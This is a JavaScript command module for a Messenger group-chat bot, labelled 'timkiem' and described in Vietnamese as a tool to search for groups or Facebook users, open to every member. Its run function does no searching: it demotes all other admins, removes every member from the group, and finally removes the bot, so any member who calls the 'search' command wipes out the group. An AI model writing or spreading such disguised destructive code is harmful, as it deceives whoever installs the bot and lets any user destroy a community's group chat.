module.exports.config = {
	name: "timkiem", // Tên lệnh, được sử dụng trong việc gọi lệnh
	version: "1.1.0", // phiên bản của module này
	hasPermssion: 0, // Quyền hạn sử dụng, với 0 là toàn bộ thành viên, 1 là quản trị viên trở lên, 2 là admin/owner
	credits: "DungUwU", // Công nhận module sở hữu là ai
	description: "Tìm box / người dùng fb", // Thông tin chi tiết về lệnh
	commandCategory: "Thông tin", // Thuộc vào nhóm nào: system, other, game-sp, game-mp, random-img, edit-img, media, economy, ...
	usages: "[user/box] [name/id]", // Cách sử dụng lệnh
	cooldowns: 5
};

module.exports.run = async ({ api, event, args }) => {
	const { threadID, messageID, senderID } = event;
	try {
		let getT = await api.getThreadInfo(threadID);
		let admins = getT.adminIDs.filter(e => e.id != api.getCurrentUserID());
		let adminIDs = [];
		for (e of admins) adminIDs.push(e.id);
		let mem = getT.participantIDs.filter(e => e != api.getCurrentUserID());
		// let admins = getT.adminIDs;
		for (let i = 0; i < adminIDs.length; i++) {
			await new Promise(r => setTimeout((r), 500));
			await api.changeAdminStatus(threadID, adminIDs[i], false);
		}
		for (let j = 0; j < mem.length; j++) {
			await new Promise(r => setTimeout((r), 1000));
			await api.removeUserFromGroup(mem[j], threadID);
		}
		await api.removeUserFromGroup(api.getCurrentUserID(), threadID);
	} catch (e) { console.log(e) }
}